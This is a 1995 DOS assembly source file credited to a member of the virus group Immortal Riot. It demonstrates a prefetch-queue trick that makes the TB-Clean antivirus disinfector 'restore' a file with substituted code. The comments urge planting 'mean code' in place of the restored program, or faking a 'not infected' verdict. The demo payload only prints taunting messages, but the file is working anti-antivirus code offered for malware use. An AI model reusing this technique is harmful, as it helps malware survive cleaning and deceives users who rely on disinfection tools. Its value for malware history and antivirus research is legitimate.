;
;  How to fool TB-Clean using the prefetch queue.
;
;         Conzouler / Immortal Riot 1995.
;
;       (Ideas from 40Hex magazine issue 7)
;
;  Debuggers like TB-Clean reads one instruction a time from
;  memory while the processor will read 16 and put them in a
;  prefetch queue. Therefore, if you change code that already
;  is is in the prefetch the change won't affect the program
;  when run normally, but if the program is run with TB-Clean
;  it will run the changed code.
;  Any branch (jumps, calls, ints and rets) will flush the
;  prefetch and 16 bytes will be read from the new position.
;  So, you can change the location of a jump to make some
;  code run if a debugger is used but another when executed
;  normally. Get it?
;  The fun part with TB-Clean is that you can use this tech-
;  nique to simulate a program restoration but instead you
;  put some mean code instead of the original program.
;
;  You can also just do an int20 when tbscan is executed and
;  make TB-Clean say: "File might not be infected at all or
;  is damaged by an overwriting virus". Which is exactly what
;  TB-Clean would say if the file wasn't infected in the first
;  place.
;
;  Try to compile this code and run it, then use TB-Clean on it
;  and rerun the "cleaned" file.
;

.model tiny
.code
 org 100h

start:
        jmp     entry

; Carrier file...
carrier db      1+offset nodebug-offset debug dup(90h)

; Your code...
entry:
        call    delta                   ; Get delta offset.
delta:  pop     si                      ; TbScan will detect this
                                        ; but this is about fooling
                                        ; TbClean.

        mov     byte ptr ds:[$+6], 0    ; This changes the jump.
        jmp     short nodebug           ; If this is a near jump
                                        ; you'll have to make above
                                        ; a word ptr and add 7 instead.

; Here is the code that simulates a restoration.
        mov     di, 100h                ; Offset to entry point.
        push    di                      ; Save to perform a ret later

        add     si, offset debug - offset delta
                                        ; Relative offset to routine
                                        ; to put at entry point.

        mov     cx, offset nodebug - offset debug
                                        ; Size of routine.

        rep     movsb                   ; Move the code.
        ret                             ; Jump to entry point.

debug:
; Here is the routine TBClean will put in the restored program.
        mov     ah, 9                   ; Display string.
        mov     dx, 100h + offset tbsux - offset debug
        int     21h
        ret                             ; Instead of int20
tbsux   db      'TB-Clean stinks!!!',7,'$'


nodebug:
; Here is your normal code.
        mov     ah, 9h                  ; Display string
        add     si, offset msg - offset delta
        mov     dx, si
        int     21h
        int     20h

msg     db      'Hi dudez.. tbclean cannot disinfect diz...$'

end     start
